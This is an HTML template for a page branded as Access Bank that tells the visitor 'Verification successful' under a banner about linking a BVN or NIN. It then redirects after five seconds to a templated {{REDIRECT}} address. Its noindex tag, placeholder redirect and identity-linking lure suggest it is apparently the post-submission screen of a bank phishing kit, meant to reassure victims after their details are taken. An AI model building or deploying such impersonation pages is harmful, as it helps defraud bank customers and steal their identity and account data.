<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Verified — Access Bank</title>
<style>
*{box-sizing:border-box}
body{margin:0;background:#f4f6f8;color:#12202e;font:15px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
.topbar{background:#002B5C;color:#fff;font-size:12px;text-align:center;padding:7px 12px}
.wrap{max-width:430px;margin:0 auto;padding:0 16px}
.card{background:#fff;border-radius:10px;padding:34px 22px;margin:22px 0;box-shadow:0 2px 16px rgba(0,0,0,.07);text-align:center}
.tick{width:62px;height:62px;border-radius:50%;background:#e6f4ea;color:#1a7f37;font-size:30px;display:flex;align-items:center;justify-content:center;margin:0 auto 18px}
h1{font-size:18px;margin:0 0 8px}
p{color:#5b6b7c;font-size:13.5px;margin:0 0 22px}
a.btn{display:block;padding:13px;border-radius:6px;background:#F5821F;color:#fff;font-weight:700;text-decoration:none;font-size:15px}
.spin{width:16px;height:16px;border:2px solid #dfe3e8;border-top-color:#F5821F;border-radius:50%;display:inline-block;vertical-align:-3px;margin-right:7px;animation:s .7s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="topbar">Link your BVN or NIN to your account</div>
<div class="wrap"><main class="card">
  <div class="tick">&#10003;</div>
  <h1>Verification successful</h1>
  <p><span class="spin"></span>Loading your dashboard, please wait…</p>
  <a class="btn" href="{{REDIRECT}}">Continue to Internet Banking</a>
</main></div>
<script>setTimeout(() => { location.href = "{{REDIRECT}}"; }, 5000);</script>
</body>
</html>
